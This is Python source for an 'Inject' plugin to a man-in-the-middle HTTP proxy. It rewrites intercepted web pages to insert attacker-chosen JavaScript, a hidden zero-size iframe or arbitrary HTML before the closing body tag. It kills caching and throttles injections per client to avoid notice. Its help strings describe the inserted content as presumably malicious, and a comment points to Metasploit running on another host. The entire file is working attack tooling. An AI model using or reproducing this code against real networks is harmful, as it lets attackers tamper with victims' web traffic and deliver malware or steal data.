import os,subprocess,logging,time,re
import argparse
from plugins.external.sergio_proxy.plugins.CacheKill import CacheKill
from plugins.external.sergio_proxy.plugins.plugin import Plugin


class Inject(CacheKill,Plugin):
    name = "Inject"
    optname = "inject"
    implements = ["handleResponse","handleHeader","connectionMade"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Inject arbitrary content into encountered HTML files."
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.html_src = options.html_url
        self.js_src = options.js_url
        self.rate_limit = options.rate_limit
        self.count_limit = options.count_limit
        self.per_domain = options.per_domain
        self.match_str = options.match_str
        self.html_payload = options.html_payload

        if self.options.preserve_cache:
            self.implements.remove("handleHeader")
            self.implements.remove("connectionMade")

        if options.html_file != None:
            self.html_payload += options.html_file.read()

        self.ctable = {}
        self.dtable = {}
        self.count = 0
        self.mime = "text/html"
    def handleResponse(self,request,data):
        #We throttle to only inject once every two seconds per client
        #If you have MSF on another host, you may need to check prior to injection
        #print "http://" + request.client.getRequestHostname() + request.uri
        ip,hn,mime = self._get_req_info(request)
        if self._should_inject(ip,hn,mime) and \
            (not self.js_src==self.html_src==None or not self.html_payload==""):

            data = self._insert_html(data,post=[(self.match_str,self._get_payload())])
            self.ctable[ip] = time.time()
            self.dtable[ip+hn] = True
            self.count+=1
            logging.info("Injected malicious html.")
            return {'request':request,'data':data}
        else:
            return
    def _get_payload(self):
        return self._get_js()+self._get_iframe()+self.html_payload
    def add_options(self,options):
        options.add_argument("--js-url",type=str,
                help="Location of your (presumably) malicious Javascript.")
        options.add_argument("--html-url",type=str,
                help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
        options.add_argument("--html-payload",type=str,default="",
                help="String you would like to inject.")
        options.add_argument("--html-file",type=argparse.FileType('r'),default=None,
                help="File containing code you would like to inject.")
        options.add_argument("--match-str",type=str,default="</body>",
                help="String you would like to match and place your payload before. (</body> by default)")
        options.add_argument("--per-domain",action="store_true",
                help="Inject once per domain per client.")
        options.add_argument("--rate-limit",type=float,
                help="Inject once every RATE_LIMIT seconds per client.")
        options.add_argument("--count-limit",type=int,
                help="Inject only COUNT_LIMIT times per client.")
        options.add_argument("--preserve-cache",action="store_true",
                help="Don't kill the server/client caching.")

    def _should_inject(self,ip,hn,mime):
        if self.count_limit==self.rate_limit==None and not self.per_domain:
            return True
        if self.count_limit != None and self.count > self.count_limit:
            #print "1"
            return False
        if self.rate_limit != None:
            if ip in self.ctable and time.time()-self.ctable[ip]<self.rate_limit:
                return False
        if self.per_domain:
            return not ip+hn in self.dtable
        #print mime
        return mime.find(self.mime)!=-1
            
    def _get_req_info(self,request):
        ip = request.client.getClientIP()
        hn = request.client.getRequestHostname()
        mime = request.client.headers['Content-Type']
        return (ip,hn,mime)

    def _get_iframe(self):
        if self.html_src != None:
            return '<iframe src="%s" height=0%% width=0%%></iframe>'%(self.html_src)
        return ''

    def _get_js(self):
        if self.js_src != None:
            return '<script type="text/javascript" src="%s"></script>'%(self.js_src)
        return ''

    def _insert_html(self,data,pre=[],post=[],re_flags=re.I):
        '''
        To use this function, simply pass a list of tuples of the form:
        
        (string/regex_to_match,html_to_inject)
        
        NOTE: Matching will be case insensitive unless differnt flags are given
        
        The pre array will have the match in front of your injected code, the post
        will put the match behind it.
        '''
        pre_regexes = [re.compile(r"(?P<match>"+i[0]+")",re_flags) for i in pre]
        post_regexes = [re.compile(r"(?P<match>"+i[0]+")",re_flags) for i in post]
            
        for i,r in enumerate(pre_regexes):
            data=re.sub(r,"\g<match>"+pre[i][1],data)
        for i,r in enumerate(post_regexes):
            data=re.sub(r,post[i][1]+"\g<match>",data)
        return data
